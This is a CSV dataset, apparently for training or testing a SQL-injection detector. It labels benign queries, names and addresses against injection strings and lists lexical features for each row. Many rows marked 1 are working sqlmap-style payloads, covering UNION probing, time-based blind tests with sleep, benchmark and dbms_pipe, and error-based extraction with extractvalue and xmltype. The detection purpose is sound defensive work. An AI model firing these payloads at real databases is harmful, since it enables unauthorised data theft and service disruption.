Query,Label,Query_preprocessed,qlen,wcount,sq,dq,puncts,comments,spaces,logic,arith,alpha,sqlkw,sqlfunc
astar@guiapolicial.lt,0,astar guiapolicial lt,21,3,0,0,2,0,0,0,0,19,0,0
flloko-humet@imarbella.ms,0,flloko humet imarbella ms,25,4,0,0,2,0,0,0,1,22,0,0
-8641%' order by 1--,1,order by,20,2,1,0,1,1,3,0,3,7,2,0
"1'||  (  select 'scwx' where 6591  =  6591 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )     )  ||'",1,select scwx where and benchmark md5 0x76555642,116,7,4,0,7,0,19,1,0,30,3,2
34347,0,,5,0,0,0,0,0,0,0,0,0,0,0
"  select extract ( month from ""2017-06-15"" ) ;",0,select extract month from,46,4,0,2,1,0,8,0,2,22,2,0
"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",1,or extractvalue concat 0x5c 0x7171706a71 select elt 0x717a767a71,138,8,0,0,6,0,21,1,0,36,2,3
"1"" where 2394  =  2394 and 8831  =  8333--",1,where and,42,2,0,1,2,1,8,1,2,8,2,0
p870en538r7,0,p870en538r7,11,1,0,0,0,0,0,0,0,4,0,0
vento8eda4,0,vento8eda4,10,1,0,0,0,0,0,0,0,8,0,0
2&,0,,2,0,0,0,1,0,0,0,0,0,0,0
"select subdate ( ""2017-06-15"", interval -2 month ) ;",0,select subdate interval month,52,4,0,2,2,0,8,0,3,26,1,0
select * from badly where won = 'red' fetch first 3 rows only,0,select from badly where won red fetch first rows only,61,10,2,0,1,0,12,0,1,44,4,0
select avg ( rain ) from found,0,select avg rain from found,30,5,0,0,0,0,6,0,0,22,2,1
"1""   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  ""ruvo"" like ""ruvo",1,and select upper xmltype chr chr chr chr chr chr chr select case when then else end from dual chr chr chr chr chr chr from dual and ruvo like ruvo,452,31,0,4,28,0,96,2,0,116,12,15
castellanos de moriscos,0,castellanos de moriscos,23,3,0,0,0,0,2,0,0,21,0,0
select count ( * )  as problem,0,select count as problem,30,4,0,0,0,0,6,0,1,20,2,1
select * from property where congress = 'additional'  and  ( during = 'dark' or street = 'stick' ) ,0,select from property where congress additional and during dark or street stick,99,12,6,0,3,0,18,2,1,67,5,0
select count ( saved ) from wherever,0,select count saved from wherever,36,5,0,0,0,0,6,0,0,28,2,1
"-1844""   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  ""abdw"" like ""abdw",1,or make_set and abdw like abdw,102,6,0,4,3,0,17,2,1,24,3,1
magrans ribes,0,magrans ribes,13,2,0,0,0,0,1,0,0,12,0,0
password:*/  =  1--,1,password,19,1,0,0,2,1,2,0,3,8,0,0
"insert into pressure ( giving, prize, powder, mail, work, common )  values  ( 'chosen', 'roll'. characteristic', 'somebody', 'soon', 'before', 'rest' )  ",0,insert into pressure giving prize powder mail work common values chosen roll characteristic somebody soon before rest,153,17,13,0,11,0,21,0,0,101,3,0
zlotnick,0,zlotnick,8,1,0,0,0,0,0,0,0,8,0,0
26586,0,,5,0,0,0,0,0,0,0,0,0,0,0
"1"" and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",1,and in char char char char char select case when then char else char end char char char char char,329,20,0,1,1,0,72,1,10,78,8,12
"-5859  )   as ernq where 8394  =  8394 union all select 8394,8394,8394--",1,as ernq where union all select,72,6,0,0,3,1,11,0,3,25,5,0
select team from pack,0,select team from pack,21,4,0,0,0,0,3,0,0,18,2,0
select * from not fetch first 50 percent rows onlyselect top 3 * from widely,0,select from not fetch first percent rows onlyselect top from widely,76,11,0,0,0,0,14,1,2,57,6,0
"1"" union all select null,null,null,null--",1,union all select null null null null,41,7,0,1,3,1,4,0,2,30,7,0
select * from neighbor where hide = 'light' fetch first 3 rows only,0,select from neighbor where hide light fetch first rows only,67,10,2,0,1,0,12,0,1,50,4,0
select indicate from western union select shelf from accurate order by warm,0,select indicate from western union select shelf from accurate order by warm,75,12,0,0,0,0,11,0,0,64,7,0
"1  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  6786  =  6786",1,and benchmark md5 0x76555642 and,95,5,0,0,3,0,16,2,0,18,2,2
6.24331e+15,0,24331e,11,1,0,0,1,0,0,0,1,1,0,0
select * from with order by science,0,select from with order by science,35,6,0,0,0,0,6,0,1,28,5,0
sp,0,sp,2,1,0,0,0,0,0,0,0,2,0,0
1.20453e+15,0,20453e,11,1,0,0,1,0,0,0,1,1,0,0
"-7422"" union all select 9127,9127,9127,9127,9127,9127,9127,9127,9127,9127#",1,union all select,74,3,0,1,10,1,4,0,1,14,3,0
"   select guide, wonder, brief from lift where outline  is null",0,select guide wonder brief from lift where outline is null,63,10,0,0,2,0,10,0,0,48,5,0
delete from port where just = 'one',0,delete from port where just one,35,6,2,0,1,0,6,0,0,26,3,0
select task ( s )  from adult union,0,select task from adult union,35,5,0,0,0,0,7,0,0,25,3,0
"calle arriola 29,",0,calle arriola,17,2,0,0,1,0,2,0,0,12,0,0
select useful from warn,0,select useful from warn,23,4,0,0,0,0,3,0,0,20,2,0
"select * from practice where face between ""according"" and    ""manner""",0,select from practice where face between according and manner,69,9,0,4,0,0,9,1,1,52,5,0
select count ( mailid ) from shore,0,select count mailid from shore,34,5,0,0,0,0,6,0,0,26,2,1
"-2838"" where 5442  =  5442 union all select 5442#",1,where union all select,49,4,0,1,2,1,8,0,1,19,4,0
delete from cloud where young = 'country',0,delete from cloud where young country,41,6,2,0,1,0,6,0,0,32,3,0
"  select general,ourselves,farther from vowel left join orders on lift.continuedid =  cattle.trip order by bent.respect",0,select general ourselves farther from vowel left join orders on lift continuedid cattle trip order by bent respect,119,18,0,0,6,0,14,0,0,97,7,1
"1"" union all select null,null,null,null,null,null,null#",1,union all select null null null null null null null,55,10,0,1,7,1,4,0,0,42,10,0
-4803%'   )    )    or 8571  =  8571--,1,or,38,1,1,0,2,1,6,1,3,2,0,0
select * from classroom where    not lonely = 'work',0,select from classroom where not lonely work,52,7,2,0,1,0,8,1,1,37,4,0
select * from swim fetch first 50 percent rows only,0,select from swim fetch first percent rows only,51,8,0,0,0,0,9,0,1,39,3,0
or 'something'   =   'some'+'thing',1,or something some thing,35,4,6,0,1,0,3,1,1,20,1,0
per8ebimie0to,0,per8ebimie0to,13,1,0,0,0,0,0,0,0,11,0,0
2.96618e+15,0,96618e,11,1,0,0,1,0,0,0,1,1,0,0
"1'   )    )     )   union all select null,null--",1,union all select null null,48,5,1,0,1,1,7,0,2,22,5,0
7.92638e+15,0,92638e,11,1,0,0,1,0,0,0,1,1,0,0
"  select tallid as id, trick as while from range",0,select tallid as id trick as while from range,48,9,0,0,1,0,9,0,0,37,4,0
 or 'something' like 'some%',1,or something like some,28,4,4,0,1,0,4,1,0,19,2,0
"1' where 2025  =  2025 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,where and select count from rdb fields as t1 rdb types as t2 rdb collations as t3 rdb functions as t4,150,21,1,0,9,1,25,1,3,77,8,1
"   select spin, truth, cotton from struggle where whether  is null",0,select spin truth cotton from struggle where whether is null,66,10,0,0,2,0,10,0,0,51,5,0
||utl_http.request,1,utl_http request,18,2,0,0,4,0,0,0,0,14,0,0
1'||  (  select 'nwve' where 7721  =  7721,1,select nwve where,42,3,3,0,3,0,7,0,0,15,2,0
select animal from first,0,select animal from first,24,4,0,0,0,0,3,0,0,21,2,0
-1304'  )   union all select 7639#,1,union all select,34,3,1,0,1,1,5,0,1,14,3,0
"  select difficultyid as id, save as even from highest",0,select difficultyid as id save as even from highest,54,9,0,0,1,0,9,0,0,43,4,0
"1'+  (  select sfuq where 8094  =  8094 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1   )    )   +'",1,select sfuq where procedure analyse extractvalue concat 0x5c benchmark md5 0x52515a50,190,11,2,0,5,0,30,0,2,64,2,6
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  ""oiuw""  =  ""oiuw",1,select dbms_pipe receive_message chr chr chr chr from dual and oiuw oiuw,159,12,0,3,11,0,29,1,0,59,3,6
"-9509  )   union all select 1193,1193,1193#",1,union all select,43,3,0,0,3,1,5,0,1,14,3,0
select * from dangerous where tears = 'sure' fetch first 3 rows only,0,select from dangerous where tears sure fetch first rows only,68,10,2,0,1,0,12,0,1,51,4,0
select option_value from wp_options where option_name  =  'options_twitter_url' limit 1,0,select option_value from wp_options where option_name options_twitter_url limit,87,8,2,0,6,0,9,0,0,67,4,0
"1 where 3535  =  3535 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,where and select count from domain domains as t1 domain columns as t2 domain tables as t3,137,17,0,0,7,1,23,1,3,70,7,1
"carrer mestre albages 61,",0,carrer mestre albages,25,3,0,0,1,0,3,0,0,19,0,0
paolo,0,paolo,5,1,0,0,0,0,0,0,0,5,0,0
roquelina,0,roquelina,9,1,0,0,0,0,0,0,0,9,0,0
--,1,,2,0,0,0,0,1,0,0,2,0,0,0
"1' in boolean mode  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  #",1,in boolean mode or select if select from select concat 0x7171706a71 select elt 0x717a767a71 0x78,263,15,1,0,8,1,43,1,2,61,8,3
"1 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- kegk",1,and like abcdefg upper hex randomblob kegk,109,7,2,0,2,1,18,1,3,36,2,3
"select sleep  (  5  )   and   (  ""innk""  =  ""innk",1,select sleep and innk innk,49,5,0,3,1,0,9,1,0,22,2,1
villaseca de henares,0,villaseca de henares,20,3,0,0,0,0,2,0,0,18,0,0
"c/ valdepalitos 155, 5-a",0,valdepalitos,24,1,0,0,1,0,3,0,2,14,0,0
 update new set silver = 'slabs'where headed = 'shoe',0,update new set silver slabs where headed shoe,53,8,4,0,2,0,9,0,0,38,3,0
"  update give set alive =  'post', city =  'hunt' where became =  lose",0,update give set alive post city hunt where became lose,70,10,4,0,4,0,13,0,0,45,3,0
1  )   as bhdj where 4472  =  4472,1,as bhdj where,34,3,0,0,1,0,7,0,0,11,2,0
"   select setting, planned+ ', ' + movement+ ' ' + string+ ', ' + solid as suggest  from stove",0,select setting planned movement string solid as suggest from stove,94,10,6,0,3,0,19,0,6,57,3,0
87853992h,0,87853992h,9,1,0,0,0,0,0,0,0,1,0,0
1 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  -- slje,1,and dbms_utility sqlid_to_sqlhash chr chr chr chr chr select case when then else end from dual chr chr chr chr chr slje,343,22,0,0,26,1,70,1,2,95,8,12
 (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1931  =  1931  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    ) ,1,select char char char char char select case when then char else char end char char char char char,306,19,0,0,1,0,68,0,10,79,7,12
santaren,0,santaren,8,1,0,0,0,0,0,0,0,8,0,0
"1',  (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select 1 from generate_series  (  8979,8979,case when   (  8979  =  8979  )   then 1 else 0 end  )   limit 1  )  ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   ",1,cast chr chr chr chr chr select from generate_series case when then else end limit text chr chr chr chr chr as numeric,370,23,1,0,27,0,76,0,0,95,9,10
1'   )    )     )   and sleep  (  5  )   and    (    (     (  'lbmp'  =  'lbmp,1,and sleep and lbmp lbmp,78,5,4,0,1,0,15,2,0,19,2,1
rufino@citycvs.as,0,rufino citycvs as,17,3,0,0,2,0,0,0,0,15,1,0
from  ( select distinct string from excellent ) ,0,from select distinct string from excellent,48,6,0,0,0,0,8,0,0,37,4,0
gayol,0,gayol,5,1,0,0,0,0,0,0,0,5,0,0
"1"" and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",1,and select count from generate_series,91,5,0,1,3,0,16,1,1,32,3,1
"select * from laugh where themselves between ""herself"" and    ""operation""",0,select from laugh where themselves between herself and operation,73,9,0,4,0,0,9,1,1,56,5,0
select hard ( s )  from off full outer join,0,select hard from off full outer join,43,7,0,0,0,0,9,0,0,31,4,0
"1%' and make_set  (  8403  =  8403,8899  )   and '%'  =  '",1,and make_set and,58,3,4,0,6,0,11,2,0,13,2,1
select top 50 percent * from substance select * from result fetch first 50 percent rows onlyselect top 3 * from blow,0,select top percent from substance select from result fetch first percent rows onlyselect top from blow,116,16,0,0,0,0,21,0,3,87,8,0
doerksen,0,doerksen,8,1,0,0,0,0,0,0,0,8,0,0
"-2007' where 9157  =  9157 union all select 9157,9157,9157,9157,9157,9157,9157,9157,9157#",1,where union all select,89,4,1,0,10,1,8,0,1,19,4,0
select make from whether union select mud from below order by maybe,0,select make from whether union select mud from below order by maybe,67,12,0,0,0,0,11,0,0,56,7,0
hallaran@manjarr.cd,0,hallaran manjarr cd,19,3,0,0,2,0,0,0,0,17,0,0
" select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1",1,select from users where id or union select version,81,9,0,1,4,2,17,1,3,42,6,1
"1  )   as nkjo where 8462  =  8462 union all select null,null,null,null,null,null,null,null,null--",1,as nkjo where union all select null null null null null null null null null,98,15,0,0,9,1,11,0,2,61,14,0
end and   (  'unko'  =  'unko,1,end and unko unko,29,4,3,0,1,0,5,1,0,14,2,0
select * from improve where steel = 'official',0,select from improve where steel official,46,6,2,0,1,0,7,0,1,35,3,0
select measure ( s )  from yard union,0,select measure from yard union,37,5,0,0,0,0,7,0,0,27,3,0
select option_value from wp_options where option_name  =  '_options_instagram_url' limit 1,0,select option_value from wp_options where option_name _options_instagram_url limit,90,8,2,0,7,0,9,0,0,69,4,0
"1""   )    )    union all select null,null,null--",1,union all select null null null,48,6,0,1,2,1,6,0,2,26,6,0
select * from division,0,select from division,22,3,0,0,0,0,3,0,1,18,2,0
r,0,,2,0,0,0,0,0,0,0,0,1,0,0
 update somebody set bark = 'excitement'where dot = 'camera',0,update somebody set bark excitement where dot camera,60,8,4,0,2,0,9,0,0,45,3,0
aguilar de bureba,0,aguilar de bureba,17,3,0,0,0,0,2,0,0,15,0,0
select * from anybody where not truck = 'tone'  and not zipper = 'build',0,select from anybody where not truck tone and not zipper build,72,11,4,0,2,0,13,3,1,51,6,0
9849,0,,4,0,0,0,0,0,0,0,0,0,0,0
"1 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  # cgow",1,and select count from sysibm systables as t1 sysibm systables as t2 sysibm systables as t3 cgow,128,17,0,0,7,1,20,1,1,76,6,1
kimbroug,0,kimbroug,8,1,0,0,0,0,0,0,0,8,0,0
1'   )    )    and 7533  =  7533 and    (    (   'ialm'  =  'ialm,1,and and ialm ialm,65,4,4,0,2,0,12,2,0,14,2,0
select * from winter where thumb = 'drew' fetch first 3 rows only,0,select from winter where thumb drew fetch first rows only,65,10,2,0,1,0,12,0,1,48,4,0
select avg ( easily ) from sat,0,select avg easily from sat,30,5,0,0,0,0,6,0,0,22,2,1
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  '%'  =  '",1,select benchmark md5 0x4c4d6142 and,78,5,3,0,3,0,12,1,0,23,2,2
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and 'gfpd'  =  'gfpd",1,select benchmark md5 0x4c4d6142 and gfpd gfpd,80,7,3,0,2,0,11,1,0,31,2,2
"1' in boolean mode  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   #",1,in boolean mode and exp select from select concat 0x7171706a71 select elt 0x717a767a71 0x78,193,14,1,0,7,1,35,1,1,57,6,3
"1'+  (  select niht where 7294  =  7294 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,select niht where and select count from domain domains as t1 domain columns as t2 domain tables as t3,155,19,1,0,7,1,26,1,4,80,8,1
-4325 order by 1--,1,order by,18,2,0,0,0,1,3,0,3,7,2,0
select * from enough fetch first 50 percent rows only,0,select from enough fetch first percent rows only,53,8,0,0,0,0,9,0,1,41,3,0
"1  )   or benchmark  (  10000000,md5  (  1   )    )   #",1,or benchmark md5,55,3,0,0,2,1,10,1,0,13,1,2
sleep  (  __time__  )  #,1,sleep __time__,24,2,0,0,5,1,4,0,0,9,0,1
itter,0,itter,5,1,0,0,0,0,0,0,0,5,0,0
select count ( examine ) from congress,0,select count examine from congress,38,5,0,0,0,0,6,0,0,30,2,1
84996241v,0,84996241v,9,1,0,0,0,0,0,0,0,1,0,0
montvez zurita,0,montvez zurita,14,2,0,0,0,0,1,0,0,13,0,0
select attached ( s )  from particles union,0,select attached from particles union,43,5,0,0,0,0,7,0,0,33,3,0
"1%'   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   '%'  =  '",1,and benchmark md5 0x76555642 and,107,5,4,0,5,0,18,2,0,18,2,2
"-8771""   )    )    union all select 6302,6302,6302,6302,6302#",1,union all select,61,3,0,1,5,1,6,0,1,14,3,0
"1  )   and make_set  (  8403  =  8403,8899  )  ",1,and make_set,47,2,0,0,3,0,9,1,0,10,1,1
select * from planning where meal = 'property',0,select from planning where meal property,46,6,2,0,1,0,7,0,1,35,3,0
0o380ado6,0,0o380ado6,9,1,0,0,0,0,0,0,0,4,0,0
"-7350'   )    )     )   union all select 9207,9207,9207,9207--",1,union all select,62,3,1,0,3,1,7,0,3,14,3,0
"pasaje magistrado salvador barbera 136,",0,pasaje magistrado salvador barbera,39,4,0,0,1,0,4,0,0,31,0,0
